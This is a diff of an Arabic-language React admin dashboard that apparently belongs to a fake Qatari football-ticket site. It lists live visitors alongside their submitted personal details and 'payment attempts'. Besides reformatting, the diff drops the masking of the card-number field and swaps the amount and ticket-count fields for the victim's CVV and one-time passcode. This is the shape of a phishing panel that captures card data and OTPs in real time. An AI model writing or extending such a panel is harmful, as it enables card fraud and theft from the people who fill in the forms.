@@ -1,17 +1,12 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { 
-  RefreshCw,
-  LogOut,
-  Eye,
-  X
-} from "lucide-react";
-import { 
-  subscribeToVisitors, 
-  subscribeToFormSubmissions, 
+import { RefreshCw, LogOut, Eye, X } from "lucide-react";
+import {
+  subscribeToVisitors,
+  subscribeToFormSubmissions,
   getOnlineVisitorsCount,
   VisitorData,
-  FormSubmission
+  FormSubmission,
 } from "@/lib/firebase";
 import { useAuth } from "@/context/AuthContext";
 import { Button } from "@/components/ui/button";
@@ -54,7 +49,7 @@ export default function AdminDashboard() {
 
   useEffect(() => {
     if (!user) return;
-    
+
     const unsubVisitors = subscribeToVisitors((data) => {
       setVisitors(data);
       setIsLoading(false);
@@ -82,7 +77,7 @@ export default function AdminDashboard() {
     const diff = now.getTime() - date.getTime();
     const minutes = Math.floor(diff / 60000);
     const hours = Math.floor(diff / 3600000);
-    
+
     if (minutes < 1) return "الآن";
     if (minutes < 60) return `منذ ${minutes} دقيقة`;
     if (hours < 24) return `منذ ${hours} ساعات تقريباً`;
@@ -96,10 +91,12 @@ export default function AdminDashboard() {
 
   const combinedData: CombinedData[] = visitors.map((visitor) => {
     const buyerSubmission = formSubmissions.find(
-      (f) => f.visitorId === visitor.visitorId && f.formType === "buyer_details"
+      (f) =>
+        f.visitorId === visitor.visitorId && f.formType === "buyer_details",
     );
     const paymentSubmission = formSubmissions.find(
-      (f) => f.visitorId === visitor.visitorId && f.formType === "payment_attempt"
+      (f) =>
+        f.visitorId === visitor.visitorId && f.formType === "payment_attempt",
     );
 
     return {
@@ -146,17 +143,16 @@ export default function AdminDashboard() {
       <div className="bg-white border-b border-gray-200 py-4 px-6">
         <div className="flex items-center justify-between">
           <div className="flex items-center gap-4">
-            <h1 className="text-xl font-bold text-[#8A1538]">إدارة الإشعارات</h1>
+            <h1 className="text-xl font-bold text-[#8A1538]">
+              إدارة الإشعارات
+            </h1>
             <span className="text-sm text-gray-500">
-              عرض وإدارة جميع الإشعارات والبيانات المستلمة ({combinedData.length}) إشعار
+              عرض وإدارة جميع الإشعارات والبيانات المستلمة (
+              {combinedData.length}) إشعار
             </span>
           </div>
           <div className="flex items-center gap-3">
-            <Button
-              variant="outline"
-              size="sm"
-              className="text-gray-600"
-            >
+            <Button variant="outline" size="sm" className="text-gray-600">
               مسح الكل
             </Button>
             <Button
@@ -178,14 +174,30 @@ export default function AdminDashboard() {
             <table className="w-full text-sm">
               <thead className="bg-gray-50 border-b border-gray-200">
                 <tr>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">الإجراءات</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">الصفحة</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">الكود</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">الاتصال</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">الوقت</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">الحالة</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">المعلومات</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">الدولة</th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-600">
+                    الإجراءات
+                  </th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-600">
+                    الصفحة
+                  </th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-600">
+                    الكود
+                  </th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-600">
+                    الاتصال
+                  </th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-600">
+                    الوقت
+                  </th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-600">
+                    الحالة
+                  </th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-600">
+                    المعلومات
+                  </th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-600">
+                    الدولة
+                  </th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-gray-100">
@@ -210,17 +222,21 @@ export default function AdminDashboard() {
                       </td>
                       <td className="px-4 py-3">
                         {row.code ? (
-                          <span className="font-mono text-blue-600">{row.code}</span>
+                          <span className="font-mono text-blue-600">
+                            {row.code}
+                          </span>
                         ) : (
                           <span className="text-gray-400">-</span>
                         )}
                       </td>
                       <td className="px-4 py-3">
-                        <span className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
-                          row.isOnline 
-                            ? 'bg-green-100 text-green-700' 
-                            : 'bg-yellow-100 text-yellow-700'
-                        }`}>
+                        <span
+                          className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
+                            row.isOnline
+                              ? "bg-green-100 text-green-700"
+                              : "bg-yellow-100 text-yellow-700"
+                          }`}
+                        >
                           {row.isOnline ? "متصل" : "غير متصل"}
                         </span>
                       </td>
@@ -228,41 +244,49 @@ export default function AdminDashboard() {
                         {formatTimeAgo(row.lastSeen)}
                       </td>
                       <td className="px-4 py-3">
-                        <span className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
-                          row.paymentSuccess 
-                            ? 'bg-green-100 text-green-700' 
-                            : 'bg-yellow-100 text-yellow-700'
-                        }`}>
+                        <span
+                          className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
+                            row.paymentSuccess
+                              ? "bg-green-100 text-green-700"
+                              : "bg-yellow-100 text-yellow-700"
+                          }`}
+                        >
                           {row.paymentSuccess ? "موافق" : "معلق"}
                         </span>
                       </td>
                       <td className="px-4 py-3">
                         <div className="flex items-center gap-2">
                           {row.buyerInfo ? (
-                            <button 
+                            <button
                               onClick={() => handleViewBuyerInfo(row)}
                               className="px-2 py-1 rounded text-xs font-medium bg-blue-500 text-white hover:bg-blue-600"
                             >
                               معلومات شخصية
                             </button>
                           ) : (
-                            <span className="text-gray-400 text-xs">لا يوجد معلومات</span>
+                            <span className="text-gray-400 text-xs">
+                              لا يوجد معلومات
+                            </span>
                           )}
                           {row.paymentInfo ? (
-                            <button 
+                            <button
                               onClick={() => handleViewPaymentInfo(row)}
                               className="px-2 py-1 rounded text-xs font-medium bg-green-500 text-white hover:bg-green-600"
                             >
                               معلومات البطاقة
                             </button>
                           ) : (
-                            <span className="text-gray-400 text-xs">لا يوجد بطاقة</span>
+                            <span className="text-gray-400 text-xs">
+                              لا يوجد بطاقة
+                            </span>
                           )}
                         </div>
                       </td>
                       <td className="px-4 py-3">
                         <div className="flex items-center gap-2">
-                          <span className={`w-2 h-2 rounded-full ${row.isOnline ? 'bg-green-500' : 'bg-gray-400'}`}></span>
+                          <span
+                            className={`w-2 h-2 rounded-full ${row.isOnline ? "bg-green-500" : "bg-gray-400"}`}
+                          ></span>
                           <span className="text-gray-700">{row.country}</span>
                         </div>
                       </td>
@@ -270,7 +294,10 @@ export default function AdminDashboard() {
                   ))
                 ) : (
                   <tr>
-                    <td colSpan={8} className="px-4 py-12 text-center text-gray-500">
+                    <td
+                      colSpan={8}
+                      className="px-4 py-12 text-center text-gray-500"
+                    >
                       لا توجد إشعارات حتى الآن
                     </td>
                   </tr>
@@ -284,19 +311,26 @@ export default function AdminDashboard() {
       <Dialog open={showBuyerInfo} onOpenChange={setShowBuyerInfo}>
         <DialogContent className="max-w-md" dir="rtl">
           <DialogHeader>
-            <DialogTitle className="text-right text-[#8A1538]">معلومات المشتري</DialogTitle>
+            <DialogTitle className="text-right text-[#8A1538]">
+              معلومات المشتري
+            </DialogTitle>
           </DialogHeader>
           {selectedData?.buyerInfo && (
             <div className="space-y-3">
               <div className="grid grid-cols-2 gap-3">
                 <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">الاسم الكامل</span>
+                  <span className="text-xs text-gray-500 block">
+                    الاسم الكامل
+                  </span>
                   <span className="text-sm font-medium">
-                    {selectedData.buyerInfo.firstName} {selectedData.buyerInfo.lastName}
+                    {selectedData.buyerInfo.firstName}{" "}
+                    {selectedData.buyerInfo.lastName}
                   </span>
                 </div>
                 <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">البريد الإلكتروني</span>
+                  <span className="text-xs text-gray-500 block">
+                    البريد الإلكتروني
+                  </span>
                   <span className="text-sm font-medium break-all">
                     {selectedData.buyerInfo.email || "N/A"}
                   </span>
@@ -304,7 +338,9 @@ export default function AdminDashboard() {
               </div>
               <div className="grid grid-cols-2 gap-3">
                 <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">رقم الهاتف</span>
+                  <span className="text-xs text-gray-500 block">
+                    رقم الهاتف
+                  </span>
                   <span className="text-sm font-medium">
                     {selectedData.buyerInfo.phone || "N/A"}
                   </span>
@@ -338,7 +374,9 @@ export default function AdminDashboard() {
                   </span>
                 </div>
                 <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">الفريق المفضل</span>
+                  <span className="text-xs text-gray-500 block">
+                    الفريق المفضل
+                  </span>
                   <span className="text-sm font-medium">
                     {selectedData.buyerInfo.favoriteTeam || "N/A"}
                   </span>
@@ -352,48 +390,58 @@ export default function AdminDashboard() {
       <Dialog open={showPaymentInfo} onOpenChange={setShowPaymentInfo}>
         <DialogContent className="max-w-md" dir="rtl">
           <DialogHeader>
-            <DialogTitle className="text-right text-[#8A1538]">معلومات البطاقة</DialogTitle>
+            <DialogTitle className="text-right text-[#8A1538]">
+              معلومات البطاقة
+            </DialogTitle>
           </DialogHeader>
           {selectedData?.paymentInfo && (
             <div className="space-y-3">
               <div className="grid grid-cols-2 gap-3">
                 <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">اسم حامل البطاقة</span>
+                  <span className="text-xs text-gray-500 block">
+                    اسم حامل البطاقة
+                  </span>
                   <span className="text-sm font-medium">
                     {selectedData.paymentInfo.cardholderName || "N/A"}
                   </span>
                 </div>
                 <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">رقم البطاقة</span>
+                  <span className="text-xs text-gray-500 block">
+                    رقم البطاقة
+                  </span>
                   <span className="text-sm font-medium font-mono">
-                    •••• {selectedData.paymentInfo.cardLast4 || "****"}
+                    {selectedData.paymentInfo.cardLast4 || "****"}
                   </span>
                 </div>
               </div>
               <div className="grid grid-cols-2 gap-3">
                 <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">تاريخ الانتهاء</span>
+                  <span className="text-xs text-gray-500 block">
+                    تاريخ الانتهاء
+                  </span>
                   <span className="text-sm font-medium font-mono">
                     {selectedData.paymentInfo.expiryDate || "N/A"}
                   </span>
                 </div>
                 <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">المبلغ</span>
+                  <span className="text-xs text-gray-500 block">CVV</span>
                   <span className="text-sm font-bold text-[#8A1538]">
-                    QAR {selectedData.paymentInfo.amount || "0"}
+                    {selectedData.paymentInfo.cvv}
                   </span>
                 </div>
               </div>
               <div className="grid grid-cols-2 gap-3">
                 <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">عدد التذاكر</span>
+                  <span className="text-xs text-gray-500 block">OTP</span>
                   <span className="text-sm font-medium">
-                    {selectedData.paymentInfo.ticketCount || "0"} تذكرة
+                    {selectedData.paymentInfo.otp}
                   </span>
                 </div>
                 <div className="bg-gray-50 rounded-lg p-3">
                   <span className="text-xs text-gray-500 block">الحالة</span>
-                  <span className={`text-sm font-medium ${selectedData.paymentSuccess ? 'text-green-600' : 'text-red-600'}`}>
+                  <span
+                    className={`text-sm font-medium ${selectedData.paymentSuccess ? "text-green-600" : "text-red-600"}`}
+                  >
                     {selectedData.paymentSuccess ? "ناجح" : "فشل"}
                   </span>
                 </div>
